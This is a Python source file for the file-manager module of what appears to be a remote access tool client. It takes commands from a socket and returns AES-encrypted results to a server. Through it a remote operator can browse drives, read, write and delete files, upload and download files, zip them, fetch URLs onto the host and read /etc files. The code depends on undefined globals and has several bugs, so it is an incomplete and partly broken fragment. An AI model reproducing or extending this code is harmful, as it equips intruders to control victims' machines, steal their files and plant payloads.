'''
FILE MANAGER
VERSION : 1.0.0
AUTHOR : ISSAC

FUNCTION
- SCAN DIRECTORY
- READ FILE
- WRITE FILE
- UPLOAD
- DOWNLOAD
- DELETE
- EXTRACT IMAGE BASE64 STRING
- ZIP ARCHIVE

'''

import os
import stat
import time
import base64
import urllib.parse
import urllib.request
import zipfile
import urllib
import pathlib
import sys

class File:
    def __init__(self, sock) -> None:
        self.sock = sock
        self.CurrentPath = os.getcwd()
        self.df_SendChunk = True # DOWNLOAD FILE SEND CHUNK.
        self.df_StopSend = False

    '''
    GET LOGICAL DRIVES
    '''
    def GetDrives(self):
        if unix_like():
            return ['/']
        else:
            import ctypes.wintypes
            kernel32 = ctypes.WinDLL("kernel32")
            kernel32.GetLogicalDriveStringsW.restype = ctypes.wintypes.DWORD
            kernel32.GetLogicalDriveStringsW.argtypes = [ctypes.wintypes.DWORD, ctypes.wintypes.LPWSTR]

            buffer_size = 255
            buffer = ctypes.create_string_buffer(buffer_size)
            buffer_pointer = ctypes.cast(buffer, ctypes.wintypes.LPWSTR)

            result = kernel32.GetLogicalDriveStringsW(buffer_size, buffer_pointer)
            drives_bytes = buffer.raw

            drives = drives_bytes.split(b'\x00')[:-1]
            drives = [drive.decode('utf-8') for drive in drives if drive]
            drives = [d for d in drives if d != ":" and d != "\\"]
            return drives

    '''
    SCAN DIR
    '''
    def format_size(self, _len:int):
        file_unit = ['B', 'KB', 'MB', 'GB', "TB"]
        index = 0
        while _len >= 1024 and index < len(file_unit) - 1:
            _len /= 1024
            index += 1
        return f"{_len:.2f} {file_unit[index]}"

    def format_time(self, timestamp):
        return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))

    def entry_properties(self, entry) -> dict:
        entry_info = {}
        try:
            entry_stat = os.stat(entry)
            entry_info = {
                'path' : os.path.abspath(entry).encode('utf-8').hex(),
                'perm' : format(stat.filemode(entry_stat.st_mode), ''),
                'size' : self.format_size(entry_stat.st_size),
                'cd' : self.format_time(entry_stat.st_ctime),
                'lmd' : self.format_time(entry_stat.st_mtime),
                'lad' : self.format_time(entry_stat.st_atime)
            }
        except Exception as e:
            entry_info = {
                'path' : entry.encode('utf-8').hex(),
                'perm' : '-',
                'size' : '-',
                'cd' : '-',
                'lmd' : '-',
                'lad' : '-'
            }
        return entry_info

    def scandir(self, path) -> str:
        try:
            result = []
            with os.scandir(path) as entries:
                for entry in entries:
                    p = self.entry_properties(entry.path)
                    v1 = ["%s:%s" % (key, p[key]) for key in p]
                    v2 = '|'.join(v1)
                    result.append(v2)
            result = '+'.join(result)
            return result
        except Exception as e:
            payload = f'File|err|{b64EnStr(str(e))}'
            buffer = b64EnStr(payload)
            self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))
            return ''

    '''
    READ FILE
    '''
    def readfile(self, path) -> str:
        file_content = 'READ FILE ERROR'
        try:
            with open(path, 'r', encoding='utf-8') as f:
                file_content = f.read()
        except:
            pass
        return file_content

    '''
    WRITE FILE
    '''
    def writefile(self, path, content) -> str:
        try:
            with open(path, 'w', encoding='utf-8') as f:
                f.write(content)
            return "1|"
        except Exception as e:
            return "0|" + e

    '''
    UPLOAD FILE
    THIS FUNCTION IS USE FOR SERVER'S UPLOAD, SO IT WILL WRITE BYTE INTO DESTINATION FILE.
    '''
    def UploadWrite(self, path, hex_content) -> str:
        while True:
            try:
                b64_bytes = bytes.fromhex(hex_content) # CONVERT BYTE FROM BASE64 STRING TO BYTES.
                with open(path, 'ab') as f: # APPEND BYTES INTO FILE.
                    f.write(b64_bytes)
                return "1|1"
            except PermissionError as e:
                continue
            except Exception as e:
                print(e)
                return "0|" + str(e)

    '''
    DOWNLOAD
    THIS FUNCTION IS USE FOR SERVER'S DOWNLOAD, SO IT WILL SEND FILE BYTE CHUNK TO SERVER.
    '''
    def DownloadSend(self, path) -> str:
        try:
            chunk_len = 1024 * 1024
            total_read = 0
            with open(path, 'rb') as f:
                f.seek(int(para[2]))
                chunk = f.read(chunk_len)
                buffer = chunk.hex()
                if not chunk:
                    buffer = f"File|df|{path}|1|foo"
                    buffer = b64EnStr(buffer)
                    print("Done")
                    self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))
                    return
                
                buffer = f"File|df|{path}|0|{buffer}" # 0 : NOT LAST, 1 : LAST ONE, BUT THE BUFFER CAN BE WHATEVER IF LAST, IT JUST A SIGNAL.
                self.df_SendChunk = False
                buffer = b64EnStr(buffer)
                self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))
                total_read += len(chunk)
            
        except Exception as e:
            print(e)

    '''
    DELETE FILE
    '''
    def DeleteFile(self, path) -> str:
        try:
            os.remove(path)
            return "1|" + path + "|"
        except Exception as e:
            return "0|" + path + "|" + e

    '''
    IMAGE BASE64
    '''
    def ImageToBase64Str(self, img_path) -> str:
        try:
            with open(img_path, 'rb') as f:
                img_data = f.read()
                b64_img = base64.b64encode(img_data).decode('utf-8')
                return '1|' + b64_img
        except Exception as e:
            return '0|' + e

    '''
    ZIP FILE
    - /path/file1,/path/file2,......
    '''
    def ArchiveCompress(self, archive_path:str, tgt_paths:list) -> str:
        compress = zipfile.ZIP_DEFLATED
        try:
            with zipfile.ZipFile(archive_path, mode='w') as zf:
                for file in tgt_paths:
                    zf.write(file, os.path.basename(file), compress_type=compress)
            return "1|" + archive_path
        except Exception as e:
            #raise e
            return "0|" + b64EnStr(str(e))

    def ArchiveExtract(self, zip_files:list, temp_dir:str) -> str:
        try:
            for file in zip_files:
                file_name = pathlib.Path(os.path.basename(file)).stem # FILE NAME WITHOUT EXTENSION
                extract_to = os.path.join(temp_dir, file_name)

                if os.path.exists(extract_to):
                    os.mkdir(extract_to)

                with zipfile.ZipFile(file, 'r') as zip_ref:
                    zip_ref.extractall(extract_to)

            return '1|' + extract_to
        except Exception as e:
            return '0|' + b64EnStr(str(e))

    '''
    WGET
    ''' 
    def wget(self, url, save_path):
        try:
            response = urllib.request.urlopen(url)
            content_disposition = response.headers.get('Content-Disposition')
            if content_disposition:
                filename = content_disposition.split("filename=")[1].split(';')[0]
                filename = urllib.parse.unquote(filename.strip('"'))
            else:
                filename = os.path.basename(url)
            
            save_path = os.path.join(save_path, filename)
            with open(save_path, 'wb') as f:
                f.write(response.read())

            return f'1|{b64EnStr(url)}|{b64EnStr(save_path)}'
        except Exception as e:
            raise e
            #return '0|' + b64EnStr(str(e))
    
    '''
    NEW FOLDER/TEXT FILE
    '''
    def New(self, folder:bool, path:str) -> str:
        try:
            if folder: # FOLDER
                os.mkdir(path)
            else: # TEXT FILE
                with open(path, 'w') as f:
                    f.write('')
            return '1|' + path
        except Exception as e:
            return '0|' + b64EnStr(e)
        
    '''
    GOTO PATH
    '''
    def goto(self, path:str) -> str:
        return f'{"1" if os.path.exists(path) else "0"}|{path}'
    
    '''
    Linux etc FILE
    '''
    def etc_files(self, name):
        try:
            data_list = []
            with open(f'/etc/{name}', 'r') as f:
                while True:
                    line = f.readline()
                    if not line:
                        break

                    data_list.append(line)
            
            data = '|'.join(data_list)
            return f'1|{b64EnStr(data)}'
        except PermissionError as e:
            return f'0|{b64EnStr(str(e))}'

    '''
    INITIALIZATION :
    - CURRENT PATH
    - SCANDIR
    '''
    def init(self):
        cp = self.CurrentPath
        scandir_str = self.scandir(cp)
        result = cp + "|" + base64.b64encode(scandir_str.encode('utf-8')).decode()
        return result

    # RUN PAYLOAD
    def run(self):
        cmd = para[0]
        payload = ''
        if cmd == 'i':
            result = self.init()
            payload = "File|i|" + result + "|" + ("/" if unix_like() else "+".join(self.GetDrives()))
        elif cmd == 'sd': # SCAN DIRECTORY
            result = self.scandir(para[1])
            payload = base64.b64encode(result.encode('utf-8')).decode()
            payload = "File|sd|" + payload
        elif cmd == 'rf': # READ FILE
            result = self.readfile(para[1])
            payload = f"File|rf|{para[1]}|" + base64.b64encode(result.encode('utf-8')).decode()
        elif cmd == 'wf': # WRITE FILE
            result = self.writefile(para[1], base64.b64decode(para[2]).decode())
            path = base64.b64encode(para[1].encode('utf8')).decode()
            _split = result.split('|')
            status = _split[0]
            msg = _split[1]
            payload = f"File|wf|{path}|{status}|{msg}"
        elif cmd == 'uf': # UPLOAD FILE
            op_code = para[1]
            result = self.UploadWrite(para[2], para[3])
            _split = result.strip('|')
            status = _split[0]
            msg = _split[1]
            payload = f"File|uf|{op_code}|{para[2]}|{status}|{msg}"
        elif cmd == 'df': # DOWNLOAD FILE
            self.DownloadSend(para[1])
            return # ERROR -> EXIT
        elif cmd == "df_s": # STOP DOWNLOAD
            self.df_StopSend = True
            payload = "File|df_s|1"
        elif cmd == "del": # DELETE FILE
            result = self.DeleteFile(para[1])
            payload = f'File|del|{result}'
        elif cmd == 'img': # READ IMAGE AND CONVERT IMAGE BYTES TO STRING
            result = self.ImageToBase64Str(para[1])
            payload = f'File|img|{para[1]}|{result}'
        elif cmd == 'af_c': # ARCHIVE FILE - COMPRESS
            result = self.ArchiveCompress(para[1], str(para[2]).split(','))
            payload = f'File|af_c|{para[1]}|{result}'
        elif cmd == 'af_e': # ARCHIVE FILE - EXTRACT
            op_code = para[1]
            result = self.ArchiveExtract(str(para[2]).split(','), para[3])
            payload = f'File|af_e|{op_code}|{result}'
        elif cmd == 'wget': # WGET FILE FROM URL
            dest_url = base64.b64decode(para[1]).decode()
            save_folder = base64.b64decode(para[2]).decode()
            mkdir = para[3]
            if mkdir == '1' and not os.pardir.exists(save_folder):
                os.mkdir(save_folder)

            result = self.wget(dest_url, save_folder)
            payload = f'File|wget|{result}'
        elif cmd == 'n_f': # NEW FOLDER
            result = self.New(True, para[1])
            payload = f'File|n_f|{result}'
        elif cmd == 'n_t': # NEW TEXT FILE
            result = self.New(False, para[1])
            payload = f'File|n_t|{result}'
        elif cmd == 'g': # GOTO
            result = self.goto(para[1])
            payload = f'File|g|' + result
        elif cmd == 'etc': # etc FILE
            result = self.etc_files(para[1])
            payload = f'File|etc|{para[1]}|{result}'
        
        buffer = b64EnStr(payload)
        self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))